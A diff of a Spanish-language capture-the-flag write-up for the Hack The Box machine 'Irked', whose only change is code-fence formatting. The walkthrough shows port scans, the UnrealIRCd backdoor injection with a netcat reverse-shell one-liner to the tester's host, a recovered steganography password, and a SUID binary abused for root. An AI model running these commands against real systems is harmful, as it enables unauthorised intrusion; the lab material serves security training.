@@ -27,7 +27,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.117
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:13 CST
 Initiating Ping Scan at 11:13
@@ -68,7 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 196.35 seconds
 
 Continuemos con el doblecheck usando `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.117
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 18:55:46 GMT
@@ -94,7 +94,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sV -sC -n -v -p22,80,111,6697,8067,54944,65534 10.10.10.117
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-02 09:26 CST
 NSE: Loaded 148 scripts for scanning.
@@ -179,7 +179,7 @@ Comencemos por enumerar el servicio de Apache:
 
 Lanzamos un `httpie` hacia la dirección y veamos su respuesta:
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ http 10.10.10.117
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -205,7 +205,7 @@ Parece que no hay mucho aquí. Excepto por la referencia de algo que parece inmi
 
 Para conectarme al servidor no usaremos nada fancy, con *tinyirc* basta:
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ tinyirc xbytemx 10.10.10.117 6697
 TinyIRC 1.1 Copyright (C) 1991-1996 Nathan Laredo
 This is free software with ABSOLUTELY NO WARRANTY.
@@ -246,7 +246,7 @@ Tenemos conectado al usuario djmardov en el único canal #UPupDOWNdownLRlrBAbaSS
 
 Fuera de eso no encontramos nada mas relevante. Pero con esto basta para buscar si hay algun exploit conocido:
 
-```text
+``` text
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit unrealirc
 ------------------------------------------------------------------------------- -------------------------------------------------------
  Exploit Title                                                                 |  Path
@@ -262,7 +262,7 @@ Shellcodes: No Result
 
 Encontramos varias opciones para la versión `3.2.8.1`, pero la que nos interesa es la que usa msf, veamos un poco que hace para lanzar el exploit:
 
-```ruby
+``` ruby
 def exploit
   connect
 
@@ -284,7 +284,7 @@ Como podemos ver a simple vista, concatena el string "AB; " con el payload encod
 
 **Shell1:**
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ printf "AB;ping -c2 10.10.14.141\n" | ncat 10.10.10.117 6697
 :irked.htb NOTICE AUTH :*** Looking up your hostname...
 :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
@@ -296,7 +296,7 @@ xbytemx@laptop:~/htb/irked$
 
 **Shell2:**
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ tshark -i tun0 'icmp'
 Capturing on 'tun0'
     1 0.000000000 10.10.10.117 → 10.10.14.141 ICMP 84 Echo (ping) request  id=0x0486, seq=1/256, ttl=63
@@ -308,7 +308,7 @@ xbytemx@laptop:~/htb/irked$
 Perfecto, con esto podemos preparar una reverse shell para conectarnos:
 
 **Shell1**
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ printf "AB; nc -e /bin/sh 10.10.14.141 3001\n" | ncat 10.10.10.117 6697
 :irked.htb NOTICE AUTH :*** Looking up your hostname...
 :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
@@ -317,7 +317,7 @@ xbytemx@laptop:~/htb/irked$ printf "AB; nc -e /bin/sh 10.10.14.141 3001\n" | nca
 Esperamos en el listener:
 
 **Shell2**
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ ncat -vnlp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -336,7 +336,7 @@ Hemos accedido como el usuario ircd.
 
 Hemos accedido como el usuario ircd, pero aun no capturamos la user.txt, eso significa que debemos movernos a otro usuario, veamos que tenemos por aquí:
 
-```text
+``` text
 ircd@irked:~/Unreal3.2$ cd ..
 lscd ..
 ircd@irked:~$
@@ -363,7 +363,7 @@ drwxr-xr-x  3 ircd     root     4.0K May 15  2018 ircd
 
 Ahora que hemos identificado al otro usuario (djmardov el del irc) revisemos que tenemos en su home:
 
-```text
+``` text
 ircd@irked:~/Unreal3.2$ ls -lahR /home/djmardov
 ls -lahR /home/djmardov
 /home/djmardov:
@@ -445,7 +445,7 @@ drwxr-xr-x 18 djmardov djmardov 4.0K Nov  3 04:40 ..
 
 En resumen, no tenemos acceso a algunas de sus carpetas y archivos, pero confirmamos la existencia de user.txt y que hay un archivo `.backup` que si podemos leer.
 
-```text
+``` text
 ircd@irked:~/Unreal3.2$ cat /home/djmardov/Documents/.backup
 cat /home/djmardov/Documents/.backup
 Super elite steg backup pw
@@ -454,7 +454,7 @@ UPupDOWNdownLRlrBAbaSSss
 
 DJmardov nos dice que la password de un "Super elite steg" es UPupDOWNdownLRlrBAbaSSss (el mismo nombre del único canal en el irc), pero si recordamos no había ninguna imagen o audio donde podamos aplicar esta contraseña, a menos que...
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ http 10.10.10.117
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -479,7 +479,7 @@ Vary: Accept-Encoding
 
 Ahí había una imagen, así que vamos a descargarla para revisarla.
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ wget 10.10.10.117/irked.jpg
 --2019-04-03 18:02:45--  http://10.10.10.117/irked.jpg
 Conectando con 10.10.10.117:80... conectado.
@@ -494,7 +494,7 @@ irked.jpg                         100%[=========================================
 
 Ok, normalmente en los retos de CTF y en algunas maquinas de HTB, se usa `steghide` para ocultar cosas, así que siguiendo esa mecánica usemos la misma herramienta.
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
 anot� los datos extra�dos e/"pass.txt".
 xbytemx@laptop:~/htb/irked$ cat pass.txt
@@ -507,7 +507,7 @@ Kab6h+m+bbp2J:HG
 
 Parece que finalmente tenemos una contraseña, o al menos el nombre del archivo dice pass, así que validemos.
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ ssh djmardov@10.10.10.117
 djmardov@10.10.10.117's password:
 
@@ -528,7 +528,7 @@ Perfecto, ya hemos pasado de ircd a djmardov.
 
 # cat user.txt
 
-```text
+``` text
 djmardov@irked:~$ cat Documents/user.txt
 ```
 
@@ -536,7 +536,7 @@ djmardov@irked:~$ cat Documents/user.txt
 
 Después de enumerar un poco, cuando busque archivos con SETUID, me llama la atención algo en particular:
 
-```text
+``` text
 djmardov@irked:/dev/shm$ find /usr/ -perm /4000
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/eject/dmcrypt-get-device
@@ -559,21 +559,21 @@ djmardov@irked:/dev/shm$ find /usr/ -perm /4000
 
 Ese archivo viewuser no se me hacia conocido de ningun lugar, inclusive lo busque dentro de los repos de debian:
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ apt-file search /usr/bin/viewuser
 xbytemx@laptop:~/htb/irked$
 ```
 
 Ahora, si ese archivo fue compilado y entregado en la maquina, podremos encontrar ciertos indicadores:
 
-```text
+``` text
 djmardov@irked:/dev/shm$ ls -lah /usr/bin/viewuser
 -rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser
 ```
 
 Mejor copiemoslo y revisemos su funcionamiento por afuera. En mi caso la copia la hago vía base64 por lo que no transmito nada sobre la red y garantizo integridad:
 
-```text
+``` text
 djmardov@irked:/dev/shm$ base64 /usr/bin/viewuser
 f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAQAQAADQAAADwFwAAAAAAADQAIAAJACgAHgAdAAYAAAA0
 AAAANAAAADQAAAAgAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUAQAAVAEAABMAAAATAAAABAAAAAEA
@@ -709,13 +709,13 @@ djmardov@irked:/dev/shm$
 
 Ahora el contenido lo guardo en un archivo viewuser.b64 y cambio el encoding:
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ base64 -d viewuser.b64 > viewuser.bin
 ```
 
 Bien, ahora usemos strace para ver sus llamadas:
 
-```text
+``` text
 xbytemx@laptop:~/htb/irked$ strace ./viewuser.bin
 execve("./viewuser.bin", ["./viewuser.bin"], 0x7ffe8df0c210 /* 55 vars */) = 0
 strace: [ Process PID=7944 runs in 32 bit mode. ]
@@ -780,7 +780,7 @@ Observamos que después de intentar el setuid a 0, a lo cual no tiene permisos e
 
 Ahora que tenemos una idea de lo que trata el binario, podemos preparar el archivo listusers con un pequeño script en bash que nos mantenga una sesión interactiva:
 
-```text
+``` text
 djmardov@irked:/dev/shm$ printf '#!/bin/bash\nbash -i\n' > /tmp/listusers
 djmardov@irked:/dev/shm$ chmod +x /tmp/listusers
 djmardov@irked:/dev/shm$ /usr/bin/viewuser
@@ -803,7 +803,7 @@ Y somos root.
 
 # cat root.txt
 
-```text
+``` text
 root@irked:~# cat /root/root.txt
 ```
 
